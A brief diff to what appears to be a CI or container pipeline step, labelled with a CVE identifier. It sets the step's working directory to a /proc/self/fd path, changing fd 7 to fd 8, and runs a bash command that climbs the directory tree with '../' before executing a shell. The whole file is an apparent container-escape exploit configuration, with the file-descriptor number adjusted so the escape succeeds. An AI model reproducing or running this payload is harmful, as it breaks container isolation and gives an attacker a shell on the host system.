@@ -4,4 +4,4 @@ steps:
       name: CVE-2024-21616
       image: ubuntu
       cmd: /bin/bash -c "cd ../../../../ && exec /bin/bash"
-      working_dir: '/proc/self/fd/7'
+      working_dir: '/proc/self/fd/8'
